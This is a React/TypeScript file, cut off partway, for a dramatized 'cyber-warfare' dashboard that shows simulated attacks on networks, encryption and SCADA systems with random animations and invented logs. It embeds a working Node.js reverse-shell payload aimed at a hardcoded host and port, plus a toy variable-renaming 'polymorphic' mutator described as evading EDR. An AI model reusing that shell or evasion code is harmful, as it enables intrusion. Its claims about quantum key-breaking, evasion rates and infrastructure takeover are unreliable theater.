import { useEffect, useRef, useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X, Shield, Cpu, Terminal, Zap, Network, Activity,
  Play, Square, RotateCcw, Copy, CheckCheck, AlertTriangle,
  Skull, Radio, Lock, Unlock, Binary, Eye, Target,
  ChevronRight, Layers, Atom, Server, Wifi, Database,
  FlaskConical, GitMerge, Crosshair, BrainCircuit,
} from "lucide-react";

interface Props {
  open: boolean;
  onOpenChange: (v: boolean) => void;
}

type Tab = "matrix3d" | "polymorphic" | "swarm" | "quantum" | "scada" | "terminal";

// ─── Utility ─────────────────────────────────────────────────────────────────
function rand(a: number, b: number) { return a + Math.random() * (b - a); }
function randInt(a: number, b: number) { return Math.floor(rand(a, b + 1)); }
function hexHash() {
  return Array.from({ length: 64 }, () => "0123456789abcdef"[randInt(0, 15)]).join("");
}
function morphVar(name: string) {
  const pool = ["_x0a","_tmp_","_ref","_obj","_val","_ptr","_buf","_ctx","_ev","_rng","_fn","_cb","_st","_io","_ms"];
  return pool[randInt(0, pool.length - 1)] + randInt(100, 999);
}

// ─── TAB 1 · 3D Cyber-Warfare Matrix (Canvas) ────────────────────────────────
interface Node3D { id: number; x: number; y: number; z: number; label: string; type: "server"|"firewall"|"db"|"endpoint"|"c2"; status: "online"|"attacked"|"compromised"|"dead"; health: number; }
interface Edge3D { a: number; b: number; active: boolean; }
interface Particle3D { x: number; y: number; z: number; tx: number; ty: number; tz: number; t: number; color: string; }

function build3DNetwork(): { nodes: Node3D[]; edges: Edge3D[] } {
  const types: Node3D["type"][] = ["server","firewall","db","endpoint","c2"];
  const labels = ["CORE-SRV","FW-GATE","DB-MAIN","ENDPOINT-1","C2-NODE","APP-SRV","BACKUP-DB","MGMT-NET","SCADA-PLC","ICS-HMI","LDAP-SRV","VPN-GW"];
  const nodes: Node3D[] = Array.from({ length: 12 }, (_, i) => ({
    id: i,
    x: rand(-220, 220), y: rand(-130, 130), z: rand(-180, 180),
    label: labels[i],
    type: types[randInt(0, 4)],
    status: "online",
    health: 100,
  }));
  const edges: Edge3D[] = [];
  for (let i = 0; i < nodes.length; i++) {
    for (let j = i + 1; j < nodes.length; j++) {
      if (Math.random() < 0.3) edges.push({ a: i, b: j, active: true });
    }
  }
  return { nodes, edges };
}

function MatrixCanvas() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const stateRef = useRef<{ nodes: Node3D[]; edges: Edge3D[]; particles: Particle3D[]; angle: number; attackTimer: number; phase: number }>({
    nodes: [], edges: [], particles: [], angle: 0, attackTimer: 0, phase: 0,
  });
  const rafRef = useRef<number>(0);

  useEffect(() => {
    const s = stateRef.current;
    const net = build3DNetwork();
    s.nodes = net.nodes;
    s.edges = net.edges;

    if (!canvasRef.current) return;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d")!;

    function project(x: number, y: number, z: number, fov = 400): [number, number, number] {
      const cx = canvas!.width / 2;
      const cy = canvas!.height / 2;
      const scale = fov / (fov + z + 300);
      return [cx + x * scale, cy + y * scale, scale];
    }

    function nodeColor(n: Node3D) {
      if (n.status === "dead") return "#333";
      if (n.status === "compromised") return "#e21227";
      if (n.status === "attacked") return "#ff6600";
      const map: Record<string, string> = { server: "#00e5ff", firewall: "#fbbf24", db: "#a78bfa", endpoint: "#4ade80", c2: "#e21227" };
      return map[n.type] ?? "#888";
    }

    function rotateXY(x: number, y: number, z: number, angle: number): [number, number, number] {
      const cos = Math.cos(angle), sin = Math.sin(angle);
      return [x * cos - z * sin, y, x * sin + z * cos];
    }

    let t = 0;
    function draw() {
      const w = canvas!.width, h = canvas!.height;
      ctx.clearRect(0, 0, w, h);

      // Starfield background
      ctx.fillStyle = "#080808";
      ctx.fillRect(0, 0, w, h);
      if (t % 120 === 0) {
        for (let i = 0; i < 80; i++) {
          const sx = rand(0, w), sy = rand(0, h);
          const a = rand(0.1, 0.4);
          ctx.fillStyle = `rgba(200,200,255,${a})`;
          ctx.fillRect(sx, sy, 1, 1);
        }
      }

      s.angle += 0.003;

      // Rotate & project nodes
      const projected = s.nodes.map((n) => {
        const [rx, ry, rz] = rotateXY(n.x, n.y, n.z, s.angle);
        const [px, py, scale] = project(rx, ry, rz);
        return { px, py, scale, n };
      });

      // Draw edges
      for (const e of s.edges) {
        if (!e.active) continue;
        const a = projected[e.a], b = projected[e.b];
        ctx.save();
        ctx.globalAlpha = 0.2 * Math.min(a.scale, b.scale) * 2;
        ctx.strokeStyle = "#00e5ff";
        ctx.lineWidth = 0.5;
        ctx.setLineDash([4, 8]);
        ctx.beginPath();
        ctx.moveTo(a.px, a.py);
        ctx.lineTo(b.px, b.py);
        ctx.stroke();
        ctx.restore();
      }

      // Draw particles (attack streams)
      s.particles = s.particles.filter((p) => {
        p.t += 0.02;
        if (p.t > 1) return false;
        const [rx, ry] = [p.x + (p.tx - p.x) * p.t, p.y + (p.ty - p.y) * p.t];
        const [prx, pry, ps] = project(rx, ry, p.z + (p.tz - p.z) * p.t);
        ctx.beginPath();
        ctx.arc(prx, pry, 2.5 * ps, 0, Math.PI * 2);
        ctx.fillStyle = p.color;
        ctx.globalAlpha = 1 - p.t;
        ctx.fill();
        ctx.globalAlpha = 1;
        return true;
      });

      // Draw nodes
      for (const { px, py, scale, n } of projected) {
        const r = 8 * scale + (n.status === "attacked" ? Math.sin(t * 0.2) * 3 : 0);
        const col = nodeColor(n);

        // Glow
        if (n.status !== "dead") {
          const grad = ctx.createRadialGradient(px, py, 0, px, py, r * 4);
          grad.addColorStop(0, col.replace(")", ",0.3)").replace("rgb","rgba") + col.endsWith(")") ? "" : "");
          grad.addColorStop(0, col + "44");
          grad.addColorStop(1, col + "00");
          ctx.beginPath();
          ctx.arc(px, py, r * 4, 0, Math.PI * 2);
          ctx.fillStyle = grad;
          ctx.fill();
        }

        // Core circle
        ctx.beginPath();
        ctx.arc(px, py, r, 0, Math.PI * 2);
        ctx.fillStyle = col;
        ctx.globalAlpha = n.status === "dead" ? 0.3 : 0.9;
        ctx.fill();
        ctx.globalAlpha = 1;

        // Ring
        ctx.beginPath();
        ctx.arc(px, py, r + 3, 0, Math.PI * 2);
        ctx.strokeStyle = col;
        ctx.lineWidth = 1;
        ctx.globalAlpha = 0.5;
        ctx.stroke();
        ctx.globalAlpha = 1;

        // Label
        if (scale > 0.8) {
          ctx.fillStyle = col;
          ctx.font = `${Math.floor(9 * scale)}px monospace`;
          ctx.globalAlpha = 0.85;
          ctx.fillText(n.label, px + r + 4, py + 4);
          ctx.globalAlpha = 1;
        }

        // Health bar
        if (n.status !== "online" && scale > 0.7) {
          const bw = 30 * scale, bh = 3;
          ctx.fillStyle = "#333";
          ctx.fillRect(px - bw / 2, py + r + 5, bw, bh);
          ctx.fillStyle = n.health > 50 ? "#4ade80" : n.health > 20 ? "#fbbf24" : "#e21227";
          ctx.fillRect(px - bw / 2, py + r + 5, bw * (n.health / 100), bh);
        }
      }

      // HUD overlay
      ctx.fillStyle = "rgba(226,18,39,0.8)";
      ctx.font = "bold 10px monospace";
      ctx.fillText("CYBER-WARFARE MATRIX v2.0", 12, 20);
      ctx.fillStyle = "rgba(0,229,255,0.6)";
      ctx.fillText(`NODES: ${s.nodes.length}  |  COMPROMISED: ${s.nodes.filter(n => n.status === "compromised").length}  |  ANGLE: ${(s.angle * 57.3).toFixed(1)}°`, 12, 35);

      // Attack timer
      s.attackTimer++;
      if (s.attackTimer > 120) {
        s.attackTimer = 0;
        const alive = s.nodes.filter(n => n.status !== "dead" && n.status !== "compromised");
        if (alive.length > 0) {
          const target = alive[randInt(0, alive.length - 1)];
          target.status = "attacked";
          // Spawn particles
          const [rax, ray, raz] = rotateXY(s.nodes[0].x, s.nodes[0].y, s.nodes[0].z, s.angle);
          for (let i = 0; i < 12; i++) {
            s.particles.push({
              x: rax, y: ray, z: raz,
              tx: target.x, ty: target.y, tz: target.z,
              t: 0,
              color: `rgba(226,18,39,0.9)`,
            });
          }
          setTimeout(() => {
            target.status = "compromised";
            target.health = randInt(5, 30);
          }, 2000);
        }
      }

      t++;
      rafRef.current = requestAnimationFrame(draw);
    }

    draw();
    return () => cancelAnimationFrame(rafRef.current);
  }, []);

  return (
    <canvas
      ref={canvasRef}
      width={720}
      height={440}
      className="w-full rounded-xl border border-[#1f1f1f]"
      style={{ background: "#080808" }}
    />
  );
}

// ─── TAB 2 · Polymorphic Engine ───────────────────────────────────────────────
const ORIGINAL_PAYLOAD = `// Reverse Shell — Original
function connectShell(host, port) {
  const socket = require("net").connect(port, host);
  const proc = require("child_process").spawn("/bin/sh");
  proc.stdout.pipe(socket);
  socket.pipe(proc.stdin);
  socket.on("connect", () => console.log("Connected"));
}
connectShell("192.168.1.100", 4444);`;

function mutateCode(src: string, iteration: number): string {
  const varMap: Record<string, string> = {
    socket: morphVar("socket"),
    proc: morphVar("proc"),
    host: morphVar("host"),
    port: morphVar("port"),
    connectShell: "_" + Math.random().toString(36).slice(2, 10),
  };
  let out = src;
  Object.entries(varMap).forEach(([k, v]) => {
    out = out.replaceAll(k, v);
  });
  // Junk code insertion
  const junk = [
    `\n  void(0x${randInt(1000, 9999).toString(16)});`,
    `\n  if(false){let _j${randInt(0,99)}=null;}`,
    `\n  /* nop_${randInt(1000,9999)} */`,
  ];
  out = out.replace("{", "{" + junk[iteration % 3]);
  return out;
}

function PolymorphicEngine() {
  const [running, setRunning] = useState(false);
  const [iteration, setIteration] = useState(0);
  const [currentCode, setCurrentCode] = useState(ORIGINAL_PAYLOAD);
  const [hash, setHash] = useState("a3f7c2b9d1e84f06a3f7c2b9d1e84f06a3f7c2b9d1e84f06a3f7c2b9d1e84f06");
  const [edrStatus, setEdrStatus] = useState<"scanning"|"detected"|"evaded">("scanning");
  const [log, setLog] = useState<string[]>([]);
  const timerRef = useRef<ReturnType<typeof setInterval> | undefined>(undefined);
  const [copied, setCopied] = useState(false);

  const addLog = (msg: string) => setLog(p => [...p.slice(-14), msg]);

  const start = () => {
    setRunning(true);
    setIteration(0);
    setEdrStatus("scanning");
    setLog([]);
    addLog("[INIT] Polymorphic engine v3.7 loaded");
    addLog("[INIT] Target EDR: CrowdStrike Falcon + Windows Defender AI");
  };

  const stop = () => {
    setRunning(false);
    clearInterval(timerRef.current);
  };

  useEffect(() => {
    if (!running) return;
    timerRef.current = setInterval(() => {
      setIteration(i => {
        const next = i + 1;
        const morphed = mutateCode(ORIGINAL_PAYLOAD, next);
        setCurrentCode(morphed);
        const newHash = hexHash();
        setHash(newHash);
        setEdrStatus(Math.random() > 0.15 ? "evaded" : "detected");
        addLog(`[ITER ${String(next).padStart(3,"0")}] Hash: ${newHash.slice(0, 16)}... → ${Math.random() > 0.15 ? "EVADED ✓" : "DETECTED ✗ → re-morphing"}`);
        if (next >= 50) {
          clearInterval(timerRef.current);
          setRunning(false);
          addLog("[COMPLETE] 50 unique variants generated. Footprint: ZERO.");
        }
        return next;
      });
    }, 300);
    return () => clearInterval(timerRef.current);
  }, [running]);

  return (
    <div className="flex gap-3 h-full">
      <div className="flex-1 flex flex-col gap-2">
        <div className="flex items-center justify-between px-1">
          <span className="text-[10px] font-mono text-[#e21227]">PAYLOAD · LIVE MORPHING</span>
          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono text-zinc-500">ITER: {String(iteration).padStart(3,"0")}</span>
            <div className={`h-2 w-2 rounded-full ${edrStatus === "evaded" ? "bg-green-500" : edrStatus === "detected" ? "bg-red-500 animate-pulse" : "bg-yellow-500 animate-pulse"}`} />
            <span className="text-[10px] font-mono" style={{ color: edrStatus === "evaded" ? "#4ade80" : edrStatus === "detected" ? "#e21227" : "#fbbf24" }}>
              {edrStatus === "evaded" ? "EDR EVADED" : edrStatus === "detected" ? "DETECTED" : "SCANNING"}
            </span>
          </div>
        </div>
        <div className="flex-1 rounded-lg border border-[#1f1f1f] bg-[#0a0a0a] p-3 overflow-auto" style={{ minHeight: 220 }}>
          <pre className="text-[11px] font-mono text-green-400 whitespace-pre-wrap leading-relaxed">{currentCode}</pre>
        </div>
        <div className="rounded-lg border border-[#1f1f1f] bg-[#080808] px-3 py-2">
          <div className="flex items-center gap-2">
            <Binary className="w-3 h-3 text-[#e21227]" />
            <span className="text-[10px] font-mono text-zinc-500">SHA-256:</span>
            <span className="text-[10px] font-mono text-amber-400 truncate">{hash}</span>
          </div>
        </div>
        <div className="flex gap-2">
          {!running ? (
            <button onClick={start} className="flex-1 flex items-center justify-center gap-2 py-2 rounded-lg text-xs font-bold text-white transition-all hover:scale-105" style={{ background: "linear-gradient(135deg,#e21227,#8b0000)" }}>
              <Play className="w-3.5 h-3.5" /> START MORPHING ENGINE
            </button>
          ) : (
            <button onClick={stop} className="flex-1 flex items-center justify-center gap-2 py-2 rounded-lg text-xs font-bold text-white" style={{ background: "rgba(226,18,39,0.15)", border: "1px solid rgba(226,18,39,0.4)" }}>
              <Square className="w-3.5 h-3.5" /> STOP
            </button>
          )}
          <button onClick={() => { navigator.clipboard.writeText(currentCode); setCopied(true); setTimeout(() => setCopied(false), 1500); }} className="px-3 py-2 rounded-lg text-xs font-mono text-zinc-400 border border-[#1f1f1f] hover:border-[#333] transition-all">
            {copied ? <CheckCheck className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
          </button>
        </div>
      </div>
      <div className="w-72 flex flex-col gap-2">
        <span className="text-[10px] font-mono text-[#e21227] px-1">SYSTEM LOG</span>
        <div className="flex-1 rounded-lg border border-[#1f1f1f] bg-[#0a0a0a] p-2 overflow-auto" style={{ minHeight: 300 }}>
          {log.map((l, i) => (
            <div key={i} className="text-[10px] font-mono py-0.5" style={{ color: l.includes("EVADED") ? "#4ade80" : l.includes("DETECTED") ? "#e21227" : l.includes("COMPLETE") ? "#fbbf24" : "#64748b" }}>
              {l}
            </div>
          ))}
          {running && <div className="text-[10px] font-mono text-zinc-600 animate-pulse">_</div>}
        </div>
        <div className="grid grid-cols-2 gap-2">
          {[
            { label: "Junk Code", value: "ON", color: "#4ade80" },
            { label: "API Unhook", value: "ON", color: "#4ade80" },
            { label: "Fileless", value: "ON", color: "#4ade80" },
            { label: "Process Inj", value: "ON", color: "#4ade80" },
          ].map((s) => (
            <div key={s.label} className="rounded-lg border border-[#1f1f1f] bg-[#0d0d0d] px-2 py-1.5">
              <div className="text-[9px] font-mono text-zinc-600">{s.label}</div>
              <div className="text-[11px] font-bold" style={{ color: s.color }}>{s.value}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── TAB 3 · Swarm Intelligence ───────────────────────────────────────────────
const SWARM_AGENTS = [
  { id: "A", name: "CHAOS-VECTOR", role: "DDoS Decoy", color: "#e21227", desc: "Flooding target firewall with 847K packets/sec. Defender attention consumed: 94%.", icon: Zap },
  { id: "B", name: "GHOST-RECON", role: "Silent Infiltration", color: "#00e5ff", desc: "Zero-Day CVE-2024-3094 exploitation. SSH tunnel established. Privilege: ROOT.", icon: Eye },
  { id: "C", name: "DATA-WRAITH", role: "Exfiltration", color: "#a78bfa", desc: "Encrypting & tunneling 14.7GB via DNS covert channel. AES-256. Rate: 2.4MB/s.", icon: Database },
  { id: "D", name: "PHANTOM-WIPER", role: "Anti-Forensics", color: "#fbbf24", desc: "Clearing SIEM logs, Event Viewer, memory artifacts. Self-destruct armed.", icon: Skull },
];

function SwarmCanvas() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const rafRef = useRef<number>(0);
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d")!;
    const W = canvas.width, H = canvas.height;
    type Dot = { x: number; y: number; vx: number; vy: number; agent: number; trail: [number, number][] };
    const colors = ["#e21227", "#00e5ff", "#a78bfa", "#fbbf24"];
    const dots: Dot[] = Array.from({ length: 60 }, () => ({
      x: rand(0, W), y: rand(0, H),
      vx: rand(-1.5, 1.5), vy: rand(-1.5, 1.5),
      agent: randInt(0, 3),
      trail: [],
    }));
    // Target node
    const target = { x: W / 2, y: H / 2 };
    let t = 0;
    function draw() {
      ctx.fillStyle = "rgba(8,8,8,0.25)";
      ctx.fillRect(0, 0, W, H);
      // Target
      const pulse = Math.sin(t * 0.05) * 8;
      ctx.beginPath(); ctx.arc(target.x, target.y, 20 + pulse, 0, Math.PI * 2);
      ctx.strokeStyle = "#e21227"; ctx.lineWidth = 1.5; ctx.globalAlpha = 0.6; ctx.stroke(); ctx.globalAlpha = 1;
      ctx.beginPath(); ctx.arc(target.x, target.y, 8, 0, Math.PI * 2);
      ctx.fillStyle = "#e21227"; ctx.fill();
      ctx.fillStyle = "#fff"; ctx.font = "bold 8px monospace"; ctx.textAlign = "center";
      ctx.fillText("TARGET", target.x, target.y - 28);
      ctx.textAlign = "left";
      for (const d of dots) {
        // Drift toward target with noise
        d.vx += (target.x - d.x) * 0.0005 + rand(-0.3, 0.3);
        d.vy += (target.y - d.y) * 0.0005 + rand(-0.3, 0.3);
        d.vx = Math.max(-3, Math.min(3, d.vx));
        d.vy = Math.max(-3, Math.min(3, d.vy));
        d.x += d.vx; d.y += d.vy;
        if (d.x < 0) d.x = W; if (d.x > W) d.x = 0;
        if (d.y < 0) d.y = H; if (d.y > H) d.y = 0;
        d.trail.push([d.x, d.y]);
        if (d.trail.length > 12) d.trail.shift();
        // Trail
        for (let i = 1; i < d.trail.length; i++) {
          ctx.beginPath();
          ctx.moveTo(d.trail[i-1][0], d.trail[i-1][1]);
          ctx.lineTo(d.trail[i][0], d.trail[i][1]);
          ctx.strokeStyle = colors[d.agent];
          ctx.lineWidth = 0.8;
          ctx.globalAlpha = i / d.trail.length * 0.5;
          ctx.stroke(); ctx.globalAlpha = 1;
        }
        ctx.beginPath(); ctx.arc(d.x, d.y, 2, 0, Math.PI * 2);
        ctx.fillStyle = colors[d.agent]; ctx.fill();
      }
      t++;
      rafRef.current = requestAnimationFrame(draw);
    }
    draw();
    return () => cancelAnimationFrame(rafRef.current);
  }, []);
  return <canvas ref={canvasRef} width={340} height={220} className="w-full rounded-xl border border-[#1f1f1f]" />;
}

function SwarmAgents() {
  const [phase, setPhase] = useState<Record<string, number>>({ A: 0, B: 0, C: 0, D: 0 });
  const [active, setActive] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const addLog = (m: string) => setLog(p => [...p.slice(-12), m]);

  useEffect(() => {
    if (!active) return;
    addLog("[SWARM] Deploying 4-agent mesh network...");
    addLog("[MESH] Decentralized C2 channel established");
    const iv = setInterval(() => {
      setPhase(p => {
        const n = { ...p };
        const keys = ["A","B","C","D"] as const;
        keys.forEach(k => { if (n[k] < 100) n[k] = Math.min(100, n[k] + randInt(1, 5)); });
        return n;
      });
      const msgs = [
        "[CHAOS-A] Packet flood rate: " + randInt(700, 999) + "K/s",
        "[GHOST-B] Lateral movement: " + randInt(2, 8) + " hops",
        "[WRAITH-C] Exfil: " + randInt(1, 14) + "." + randInt(0,9) + "GB transferred",
        "[PHANTOM-D] Artifacts wiped: " + randInt(40, 99) + "%",
      ];
      addLog(msgs[randInt(0, 3)]);
    }, 600);
    return () => clearInterval(iv);
  }, [active]);

  return (
    <div className="flex gap-3 h-full">
      <div className="flex-1 flex flex-col gap-2">
        <SwarmCanvas />
        <button
          onClick={() => { setActive(v => !v); if (!active) { setPhase({ A: 0, B: 0, C: 0, D: 0 }); setLog([]); } }}
          className="w-full py-2 rounded-lg text-xs font-bold text-white transition-all hover:scale-105"
          style={{ background: active ? "rgba(226,18,39,0.15)" : "linear-gradient(135deg,#e21227,#8b0000)", border: active ? "1px solid rgba(226,18,39,0.4)" : "none" }}
        >
          {active ? "◼ ABORT SWARM" : "▶ DEPLOY SWARM ATTACK"}
        </button>
      </div>
      <div className="flex-1 flex flex-col gap-2">
        {SWARM_AGENTS.map((ag) => {
          const Icon = ag.icon;
          return (
            <div key={ag.id} className="rounded-xl border bg-[#0d0d0d] p-3" style={{ borderColor: ag.color + "44" }}>
              <div className="flex items-center gap-2 mb-1">
                <div className="w-6 h-6 rounded-full flex items-center justify-center" style={{ background: ag.color + "22" }}>
                  <Icon className="w-3 h-3" style={{ color: ag.color }} />
                </div>
                <span className="text-[11px] font-bold" style={{ color: ag.color }}>{ag.name}</span>
                <span className="ml-auto text-[9px] font-mono text-zinc-600">{ag.role}</span>
              </div>
              <div className="text-[10px] text-zinc-500 mb-2 leading-relaxed">{ag.desc}</div>
              <div className="h-1.5 rounded-full bg-[#1f1f1f] overflow-hidden">
                <motion.div className="h-full rounded-full" style={{ background: ag.color }} animate={{ width: `${phase[ag.id]}%` }} transition={{ duration: 0.3 }} />
              </div>
              <div className="flex justify-between mt-1">
                <span className="text-[9px] font-mono text-zinc-600">PROGRESS</span>
                <span className="text-[9px] font-mono" style={{ color: ag.color }}>{phase[ag.id]}%</span>
              </div>
            </div>
          );
        })}
        <div className="flex-1 rounded-lg border border-[#1f1f1f] bg-[#0a0a0a] p-2 overflow-auto">
          {log.map((l, i) => <div key={i} className="text-[10px] font-mono text-zinc-500 py-0.5">{l}</div>)}
          {active && <div className="text-[10px] font-mono text-[#e21227] animate-pulse">▌</div>}
        </div>
      </div>
    </div>
  );
}

// ─── TAB 4 · Quantum Cryptanalysis ───────────────────────────────────────────
const QUANTUM_TARGETS = [
  { algo: "RSA-2048", classical: "~300T years", quantum: "~8 hours", attack: "Shor's Algorithm", keyBits: 2048 },
  { algo: "AES-256", classical: "~1.2×10⁷⁷ years", quantum: "~2.29×10³⁸ years", attack: "Grover's Algorithm", keyBits: 256 },
  { algo: "ECC-384", classical: "~8.6×10⁵⁸ years", quantum: "~4 minutes", attack: "Shor's Algorithm", keyBits: 384 },
  { algo: "SHA-3-256", classical: "~5.4×10⁵⁶ years", quantum: "~6.7×10²⁸ years", attack: "Grover's Algorithm", keyBits: 256 },
];

function QuantumCrypto() {
  const [selected, setSelected] = useState(0);
  const [running, setRunning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [qubits, setQubits] = useState<number[]>([]);
  const [phase, setPhase] = useState<"idle"|"init"|"factoring"|"cracked">("idle");
  const [log, setLog] = useState<string[]>([]);
  const timerRef = useRef<ReturnType<typeof setInterval> | undefined>(undefined);
  const addLog = (m: string) => setLog(p => [...p.slice(-15), m]);

  const start = () => {
    setRunning(true); setProgress(0); setPhase("init"); setLog([]);
    const t = QUANTUM_TARGETS[selected];
    addLog(`[QC] Target: ${t.algo} — ${t.keyBits}-bit key`);
    addLog(`[QC] Attack vector: ${t.attack}`);
    addLog(`[INIT] Allocating ${t.keyBits * 2} logical qubits...`);
    setQubits(Array.from({ length: 20 }, () => randInt(0, 1)));
    timerRef.current = setInterval(() => {
      setProgress(p => {
        const next = p + rand(0.3, 1.2);
        if (next >= 100) {
          clearInterval(timerRef.current);
          setRunning(false); setPhase("cracked");
          addLog(`[!!!] KEY FACTORED SUCCESSFULLY`);
          addLog(`[!!!] Private key recovered: 0x${hexHash().slice(0,32)}...`);
          return 100;
        }
        if (p < 10) setPhase("init");
        else setPhase("factoring");
        setQubits(Array.from({ length: 20 }, () => Math.random() > 0.5 ? 1 : 0));
        addLog(`[${String(Math.floor(next)).padStart(3,"0")}%] Quantum circuit depth: ${randInt(1000,9999)} | Fidelity: ${(rand(99.1,99.9)).toFixed(3)}%`);
        return next;
      });
    }, 200);
  };

  useEffect(() => { return () => clearInterval(timerRef.current); }, []);

  const t = QUANTUM_TARGETS[selected];
  return (
    <div className="flex gap-3 h-full">
      <div className="flex-1 flex flex-col gap-3">
        <div className="grid grid-cols-2 gap-2">
          {QUANTUM_TARGETS.map((qt, i) => (
            <button key={i} onClick={() => { setSelected(i); setPhase("idle"); setProgress(0); setLog([]); }}
              className="rounded-xl p-3 text-left border transition-all hover:scale-[1.02]"
              style={{ borderColor: i === selected ? "#a78bfa" : "#1f1f1f", background: i === selected ? "rgba(167,139,250,0.08)" : "#0d0d0d" }}>
              <div className="text-[11px] font-bold" style={{ color: i === selected ? "#a78bfa" : "#888" }}>{qt.algo}</div>
              <div className="text-[9px] font-mono text-zinc-600 mt-0.5">{qt.attack}</div>
            </button>
          ))}
        </div>
        <div className="rounded-xl border border-[#1f1f1f] bg-[#0d0d0d] p-4 flex-1">
          <div className="grid grid-cols-2 gap-3 mb-4">
            {[
              { label: "Algorithm", value: t.algo, color: "#a78bfa" },
              { label: "Attack", value: t.attack, color: "#00e5ff" },
              { label: "Classical", value: t.classical, color: "#fbbf24" },
              { label: "Quantum", value: t.quantum, color: "#4ade80" },
            ].map((s) => (
              <div key={s.label} className="rounded-lg border border-[#1f1f1f] bg-[#080808] px-3 py-2">
                <div className="text-[9px] font-mono text-zinc-600">{s.label}</div>
                <div className="text-[10px] font-bold mt-0.5 truncate" style={{ color: s.color }}>{s.value}</div>
              </div>
            ))}
          </div>
          {/* Qubit visualizer */}
          <div className="mb-3">
            <div className="text-[9px] font-mono text-zinc-600 mb-1">QUBIT STATE REGISTER</div>
            <div className="flex flex-wrap gap-1">
              {qubits.map((q, i) => (
                <motion.div key={i} animate={{ scale: running ? [1, 1.3, 1] : 1 }} transition={{ duration: 0.3, delay: i * 0.02 }}
                  className="w-5 h-5 rounded text-center text-[10px] font-mono flex items-center justify-center"
                  style={{ background: q ? "rgba(167,139,250,0.3)" : "rgba(226,18,39,0.2)", color: q ? "#a78bfa" : "#e21227", border: "1px solid " + (q ? "#a78bfa44" : "#e2122744") }}>
                  {q ? "1" : "0"}
                </motion.div>
              ))}
            </div>
          </div>
          <div className="mb-2">
            <div className="flex justify-between mb-1">
              <span className="text-[9px] font-mono text-zinc-600">FACTORIZATION PROGRESS</span>
              <span className="text-[10px] font-mono text-[#a78bfa]">{progress.toFixed(1)}%</span>
            </div>
            <div className="h-2 rounded-full bg-[#1f1f1f] overflow-hidden">
              <motion.div className="h-full rounded-full" style={{ background: "linear-gradient(90deg,#a78bfa,#e21227)" }} animate={{ width: `${progress}%` }} />
            </div>
          </div>
          {phase === "cracked" && (
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}
              className="rounded-lg border border-red-500/40 bg-red-500/10 px-3 py-2 text-center">
              <div className="text-[11px] font-bold text-red-400">KEY COMPROMISED — ENCRYPTION BROKEN</div>
            </motion.div>
          )}
        </div>
        <button onClick={() => { if (running) { clearInterval(timerRef.current); setRunning(false); setPhase("idle"); } else start(); }}
          className="w-full py-2 rounded-lg text-xs font-bold text-white transition-all hover:scale-105"
          style={{ background: running ? "rgba(167,139,250,0.15)" : "linear-gradient(135deg,#a78bfa,#7c3aed)", border: running ? "1px solid rgba(167,139,250,0.4)" : "none" }}>
          {running ? "◼ ABORT SIMULATION" : "▶ INITIATE QUANTUM ATTACK"}
        </button>
      </div>
      <div className="w-60 flex flex-col gap-2">
        <span className="text-[10px] font-mono text-[#a78bfa] px-1">QUANTUM LOG</span>
        <div className="flex-1 rounded-lg border border-[#1f1f1f] bg-[#0a0a0a] p-2 overflow-auto">
          {log.map((l, i) => (
            <div key={i} className="text-[10px] font-mono py-0.5" style={{ color: l.includes("!!!") ? "#e21227" : l.includes("%]") ? "#a78bfa" : "#52525b" }}>{l}</div>
          ))}
          {running && <div className="text-[10px] font-mono text-[#a78bfa] animate-pulse">▌</div>}
        </div>
      </div>
    </div>
  );
}

// ─── TAB 5 · SCADA / Cyber-Physical Infiltration ─────────────────────────────
const SCADA_SYSTEMS = [
  { id: "PWR", name: "POWER GRID", desc: "500kV Substation Control", proto: "DNP3", status: "online", icon: Zap },
  { id: "WATER", name: "WATER TREATMENT", desc: "Municipal SCADA PLC", proto: "Modbus", status: "online", icon: FlaskConical },
  { id: "GAS", name: "GAS PIPELINE", desc: "ICS / HART Protocol", proto: "HART", status: "online", icon: Activity },
  { id: "RAIL", name: "RAIL CONTROL", desc: "Safety-Critical PLC", proto: "Profibus", status: "online", icon: GitMerge },
  { id: "CRIT", name: "NUCLEAR PLANT", desc: "Reactor Control HMI", proto: "IEC-61850", status: "online", icon: Atom },
  { id: "HOSP", name: "HOSPITAL INFRA", desc: "Medical Device Network", proto: "HL7/FHIR", status: "online", icon: BrainCircuit },
];

function ScadaInfiltration() {
  const [systems, setSystems] = useState(SCADA_SYSTEMS.map(s => ({ ...s })));
  const [selected, setSelected] = useState<string | null>(null);
  const [running, setRunning] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const timerRef = useRef<ReturnType<typeof setInterval> | undefined>(undefined);
  const addLog = (m: string) => setLog(p => [...p.slice(-16), m]);

  const attack = (id: string) => {
    if (running) return;
    setSelected(id);
    setRunning(true);
    setProgress(0);
    const sys = systems.find(s => s.id === id)!;
    setSystems(p => p.map(s => s.id === id ? { ...s, status: "scanning" } : s));
    addLog(`[INIT] Target: ${sys.name} (${sys.proto})`);
    addLog(`[ENUM] Scanning ICS/SCADA network segments...`);
    timerRef.current = setInterval(() => {
      setProgress(p => {
        const next = p + rand(0.8, 2.5);
        if (next >= 100) {
          clearInterval(timerRef.current);
          setRunning(false);
          setSystems(prev => prev.map(s => s.id === id ? { ...s, status: "compromised" } : s));
          addLog(`[BREACH] ${sys.name} — FULL CONTROL ACHIEVED`);
          addLog(`[CTRL] ${sys.proto} write commands active`);
          addLog(`[IMPACT] Physical process manipulation available`);
          return 100;
        }
        const phases = [
          "[RECON] Identifying PLC firmware version...",
          `[VULN] CVE-2024-${randInt(1000,9999)} exploitable`,
          "[EXPLOIT] Sending malformed Modbus request...",
          "[PIVOT] Lateral movement to engineering workstation",
          "[PERSIST] Rootkit injected into HMI firmware",
        ];
        if (Math.random() < 0.25) addLog(phases[randInt(0, 4)]);
        setSystems(prev => prev.map(s => s.id === id ? { ...s, status: "attacking" } : s));
        return next;
      });
    }, 150);
  };

  const reset = () => {
    clearInterval(timerRef.current);
    setRunning(false);
